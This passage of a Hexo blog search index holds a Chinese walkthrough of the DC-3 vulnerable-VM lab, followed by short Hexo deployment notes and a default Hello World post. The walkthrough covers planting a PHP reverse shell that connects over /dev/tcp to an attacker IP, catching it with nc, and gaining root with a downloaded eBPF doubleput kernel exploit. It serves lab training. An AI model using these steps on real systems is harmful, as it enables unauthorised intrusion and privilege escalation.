class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;192.168.204.128&#x27;</span>;  // 攻击者的IP地址<br><span class="hljs-variable">$port</span> = 9999;          // 攻击者的端口号<br><br><span class="hljs-variable">$descriptorspec</span> = array(<br>    0 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),   // stdin 是一个管道，子进程从中读取数据<br>    1 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>),   // stdout 是一个管道，子进程向其中写入数据<br>    2 =&gt; array(<span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)    // stderr 是一个管道，子进程向其中写入数据<br>);<br><br><span class="hljs-variable">$process</span> = proc_open(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/<span class="hljs-variable">$ip</span>/<span class="hljs-variable">$port</span> 0&gt;&amp;1&#x27;&quot;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br><br><span class="hljs-keyword">if</span> (is_resource(<span class="hljs-variable">$process</span>)) &#123;<br>    fclose(<span class="hljs-variable">$pipes</span>[0]);  // 关闭stdin<br>    fclose(<span class="hljs-variable">$pipes</span>[1]);  // 关闭stdout<br>    fclose(<span class="hljs-variable">$pipes</span>[2]);  // 关闭stderr<br><br>    proc_close(<span class="hljs-variable">$process</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>将这段php代码（掐头去尾）分别加入到两个模板文件中的index.php文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004311523.png" alt="image-20240704004311523"></p><p>在终端监听设置的端口 <code>9999</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p><code>nc</code>：netstat，用于监听指定端口，可用于读取或写入网络连接的数据。</p><p><code>-l</code>：监听模式，指示其在指定的端口上监听连接请求。</p><p><code>-v</code>：详细模式</p><p><code>-vv</code>：更详细的详细模式</p><p><code>-p</code>：指定监听的端口号</p><p>然后访问目标网页URL<code>http://192.168.204.132/index.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704004700989.png" alt="image-20240704004700989"></p><p>反弹成功，成功获取<code>www-data</code>的权限，伪装成为用户www-data。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005119035.png" alt="image-20240704005119035"></p><h3 id="检索提权命令"><a href="#检索提权命令" class="headerlink" title="检索提权命令"></a>检索提权命令</h3><h4 id="查看可使用的命令"><a href="#查看可使用的命令" class="headerlink" title="查看可使用的命令"></a>查看可使用的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">compgen -c<br><br>//查看并过滤与模式列表的模式整行匹配的命令<br>compgen -c | grep -E -x <span class="hljs-string">&quot;nmap|vim|vi|nano|bash|less|more|cp|find|git|wget|cat|apt|zip|xxd|time|taskset|sed|pip|ed|tmux|scp|perl|awk|man|env|ftp&quot;</span><br></code></pre></td></tr></table></figure><p><code>-E</code>：表示使用扩展正则表达式进行匹配。</p><p><code>-x</code>：只匹配整行，即完全匹配 模式 中的整行内容，例nmap。即不断章取义的意思</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005209848.png" alt="image-20240704005209848"></p><h4 id="查看具有SUID权限的命令"><a href="#查看具有SUID权限的命令" class="headerlink" title="查看具有SUID权限的命令"></a>查看具有SUID权限的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005240879.png" alt="image-20240704005240879"></p><p>可执行的命令和能够提权的命令之间似乎没用交集，也就是已知的可使用的命令都不能够用来提权。</p><h3 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h3><p>通过以下指令查询使用的操作系统信息以及内核相关信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -a  // 显示系统信息 -a表示可用信息<br><span class="hljs-built_in">cat</span> /etc/issue   //查看系统的简要说明或欢迎信息<br><span class="hljs-built_in">cat</span> /etc/*-release  //查看系统的发行版本信息<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704005611511.png" alt="image-20240704005611511"></p><p>可以得到的信息是：</p><blockquote><p>Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU&#x2F;Linux</p><p>Ubuntu 16.04 LTS（VERSION&#x3D;”16.04 LTS (Xenial Xerus)”）</p></blockquote><p>通过searchsploit查找可利用的漏洞代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704010041749.png" alt="image-20240704010041749"></p><p>搜索结果不少，一般来说，文件后缀名为<code>txt</code>的漏洞利用比较容易实现。可以对搜索得到的漏洞进行逐一尝试（一共有六个）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -p 40937.txt<br>searchsploit -p 40943.txt<br>searchsploit -p 41923.txt<br>searchsploit -p 39773.txt<br>searchsploit -p 39772.txt<br>searchsploit -p 40489.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110327425.png" alt="image-20240704110327425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704110814118.png" alt="image-20240704110814118"></p><blockquote><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40937.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40943.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;41923.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;dos&#x2F;39773.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt</p><p>&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40489.txt</p><p>没有什么有用的提示</p><p>给出了两个利用文件以及文件下载地址</p><p>给出了漏洞概述以及漏洞代码，似乎没有利用方法</p><p>没有什么有用的提示</p><p>给出了漏洞文件的下载地址以及使用方法（√）</p><p>给出了提权方法，但是是利用ipv6的兼容端口复用的，利用方法没给</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114451762.png" alt="image-20240704114451762"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">（进入到对应目录）<br>./compile.sh<br>./doubleput<br>（等待提权成功）<br><span class="hljs-built_in">id</span>   // 验证当前用户身份，是否提权成功<br></code></pre></td></tr></table></figure><blockquote><p>Proof of Concept（概念验证）: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552</a><br>Exploit-DB Mirror（下载镜像）: <a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip">https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</a></p></blockquote><p>点击下载镜像之后，跳转到浏览器，自动下载成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704114809119.png" alt="image-20240704114809119"></p><p>嗯！怎么可以在本物理机下载漏洞呢！得下在虚拟机啊！记住要以目标靶机合法用户的身份下载！因为后续要进行提权！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip<br></code></pre></td></tr></table></figure><p>下载并保存成功了！保存文件名为“39772.zip”</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121612377.png" alt="image-20240704121612377"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip 39772.zip<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121708628.png" alt="image-20240704121708628"></p><p>创建了一个名为“39772”的文件夹，进入看看它有什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 39772<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704121729949.png"></p><p>对这两个tar文件进行解压缩：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xvf crasher.tar<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p>**<code>tar</code>**：是 Linux 和类 Unix 系统中用于处理归档文件的命令。</p><p>**<code>-x</code>**：表示执行解压缩操作（extract），即从归档文件中提取文件。</p><p>**<code>-v</code>**：可选参数，表示详细模式（verbose），在解压缩过程中显示详细信息。</p><p>**<code>-f</code>**：指定要操作的归档文件的名称。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123036561.png" alt="image-20240704123036561"></p><p>查看当前目录下的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123117671.png" alt="image-20240704123117671"></p><p>第二第三个文件的前缀是不是和前面获得的漏洞利用方法那儿一致呀！进入exploit利用文件（因为我们要利用漏洞嘛），然后执行提权命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123558257.png" alt="image-20240704123558257"></p><p>根据提示信息，我们现在已经获取了root权限！</p><p>开启交互界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>验证是否为root权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704123736857.png" alt="image-20240704123736857"></p><p>接下来就是要找到那个唯一的flag文件了，启用find命令查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124000907.png" alt="image-20240704124000907"></p><p>cat一下看看啦！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/the-flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240704124054377.png" alt="image-20240704124054377"></p><p>至此，所有工作完成！</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>sqlmap注入、john碰撞爆破hash、一句话木马注入、通过prop_open反弹shell</p><ul><li><p>拿站后进行提权的方式多样，其中包括</p><ul><li>可执行的二进制文件具有suid权限，特别是相关命令的提权</li><li>内核漏洞脏牛提权</li><li>密码复用提权</li><li>明文root密码提权</li><li>第三方服务提权</li></ul></li><li><p>sqlmap的使用方法多样，通过多种使用方法可以实现不同的效果</p></li><li><p>拿到网站后台管理系统后，可以寻找发布网页或者网页本身内容的php文件，通过插入一句话木马或者反弹shell实现getshell</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>有关部署GitHub博客的坑</title>
    <link href="/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/"/>
    <url>/2024/06/28/%E6%9C%89%E5%85%B3%E9%83%A8%E7%BD%B2GitHub%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<blockquote><p>也就是说，如果想创建一个新的博客。执行步骤是：</p><ul><li>新建一个空文件夹</li><li>终端进入该文件夹中，hexo init</li><li>需要下载git，npm install hexo-deployer-git -save</li><li>然后修改博客目录下的 _config.yml 文件，修改语言（注意，名字需要先到主题文件夹下的language上查看，不要拼写错名字了）</li><li>添加deploy配置，type（git），repo（仓库的ssh链接），branch（main）</li><li>hexo g</li><li>hexo d</li><li>hexo s查看效果</li></ul></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/06/28/hello-world/"/>
    <url>/2024/06/28/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><p>?????测试问号。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
